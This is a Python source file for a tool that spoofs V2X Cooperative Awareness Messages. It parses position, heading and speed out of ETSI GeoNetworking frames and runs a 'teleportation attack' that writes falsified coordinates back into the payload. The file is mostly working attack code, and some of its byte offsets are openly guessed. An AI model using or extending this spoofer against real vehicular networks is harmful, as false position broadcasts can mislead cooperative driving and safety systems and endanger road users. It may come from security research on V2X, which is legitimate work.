from modules import teleport
from enum import Enum

class ATTACK_TYPES(Enum):
    TELEPORT = 1
    TURNAROUND = 2

class CAMSpoofer:
    def __init__(self, mac, payload, attack_type=ATTACK_TYPES.TELEPORT):
        self.attack_type = attack_type
        self.mac = mac
        self.payload = bytearray(payload)  # Make mutable for modification
        self.lat, self.lon, self.heading, self.speed = None, None, None, None
        
    """  Payload is bytes 14-98 inside the frame
        ❗Important: for every payload manipulation
         substract 14 from each byte index   """ 
        
    def run(self):
        print(f"   💀 CAMSpoofer running for station mac {self.mac}")
        self.process_valuies()
        self.attack()
        self.modify_payload()
    
    def attack(self):
       if self.attack_type == ATTACK_TYPES.TELEPORT:
           print(f"   📌Teleportation attack: falsifieng coordinates: {self.lat} {self.lon}")
           self.lat, self.lon = teleport.teleport(self.lat, self.lon)
           
    
    def process_valuies(self):
   
        """   From ETSI EN 302 636-4-1 'Long Position Vector' (9.5.2) paragraph
              We utilize the definied structure (Figure 9.5.2.1)
              In our custom network frame it is found in bytes 26-49 
              From this section we will substract the Lat, Long values   """
        
        lpv_payload = self.payload[26-14:49-14]
        # From 9.5.2.2 Fields: Latitude and Longitude are 4 bytes each (unsigned int32)
        lat_payload = lpv_payload[12:16]  # 4 bytes for latitude
        lon_payload = lpv_payload[16:20]  # 4 bytes for longitude
        self.lat = int.from_bytes(lat_payload, byteorder='big', signed=False)
        self.lon = int.from_bytes(lon_payload, byteorder='big', signed=False)
        
        print(f"      GeoNetworking LPV: lat={self.lat}, lon={self.lon}")
        
        
        """ Inside Intelligent Transport Systems (Bytes 58-98)
            using ETSI TS 102 894-2 V1.3.1 (ITS Data Dictionary)
            we subtract the following:
                - latitude / longitude (in CAM Basic Container)
                - speed
                - heading   """ 
        
        its_payload = self.payload[58 - 14:]
        
        # Read CAM Basic Container reference position (trying different offsets)
        # ETSI EN 302 637-2: Basic Container includes referencePosition
        # Try offset 9 (common for CAM structure after header)
        cam_lat_payload = its_payload[9:13]  # 4 bytes
        cam_lon_payload = its_payload[13:17]  # 4 bytes
        cam_lat = int.from_bytes(cam_lat_payload, byteorder='big', signed=True)
        cam_lon = int.from_bytes(cam_lon_payload, byteorder='big', signed=True)
        
        print(f"      CAM ITS (offset 9): lat={cam_lat}, lon={cam_lon}")
        print(f"      Hex at offset 9: {its_payload[9:17].hex()}")
        
        heading_payload = its_payload[84 - 58 : 86 - 58]  # 2 bytes for heading
        speed_payload = its_payload[86 - 58 : 88 - 58]    # 2 bytes for speed
        self.heading = int.from_bytes(heading_payload, byteorder='big', signed=False)
        self.speed = int.from_bytes(speed_payload, byteorder='big', signed=False)
    
    def modify_payload(self):
        """Update payload with modified values."""
        
        lat_bytes = self.lat.to_bytes(4, byteorder='big', signed=False)
        lon_bytes = self.lon.to_bytes(4, byteorder='big', signed=False)
        
        lat_bytes_ITS = self.lat.to_bytes(4, byteorder='big', signed=True)
        lon_bytes_ITS = self.lon.to_bytes(4, byteorder='big', signed=True)
        
        
        # Modify lvp inside GeoNetworking header
        
        # Calculate absolute positions in payload
        lpv_start = 26 - 14
        lat_start = lpv_start + 12  # Latitude at offset 12 in LPV
        lon_start = lpv_start + 16  # Longitude at offset 16 in LPV
        
        # Update latitude (4 bytes)
        self.payload[lat_start:lat_start+4] = lat_bytes
        
        # Update longitude (4 bytes)
        self.payload[lon_start:lon_start+4] = lon_bytes
        
        # Modify lat, lon, speed, heading inside ITS header
        
        heading_bytes = self.heading.to_bytes(2, byteorder='big', signed=False)
        speed_bytes = self.speed.to_bytes(2, byteorder='big', signed=False)
        its_start = 58 - 14
        self.payload[its_start + (84-58):its_start + (84-58) + 2] = heading_bytes
        self.payload[its_start + (86-58):its_start + (86-58) + 2] = speed_bytes
        
        # Update CAM Basic Container reference position (offset 9 in ITS payload)
        # Frame bytes: 58 (ITS start) + 9 = 67 for lat, 71 for lon
        # self.payload[its_start + 9:its_start + 13] = lat_bytes_ITS   # 4 bytes lat
        # self.payload[its_start + 13:its_start + 17] = lon_bytes_ITS  # 4 bytes lon
        
        # We do not update lat, lon inside ITS header as it supposetly is UPER encoded
        
         
        
    def get_modified_payload(self):
        return self.payload
        
        
        
        
        
        
        
        